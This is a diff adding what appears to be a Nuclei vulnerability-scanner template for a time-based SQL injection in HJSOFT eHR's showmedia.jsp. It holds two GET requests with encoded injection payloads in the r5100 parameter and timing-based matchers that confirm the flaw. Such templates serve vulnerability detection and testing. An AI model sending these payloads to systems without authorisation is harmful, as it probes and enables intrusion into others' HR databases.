@@ -1,0 +1,41 @@
+id: hjsoft-ehr-showmedia-sqli
+info:
+  name: HJSOFT eHR SQL Injection in showmedia.jsp
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+http:
+  - raw:
+      - |
+        GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9Y5s1xDAUfUx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= 8000
+          - duration <= 10000
+      - type: word
+        part: body
+        words:
+          - '<input type="hidden" name="r5000" value="">'
+  - raw:
+      - |
+        GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9UbgPAATTP2HJFPAATTP2NRYxLQ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= 3000
+          - duration <= 5000
+      - type: word
+        part: body
+        words:
+          - '<input type="hidden" name="r5000" value="">'
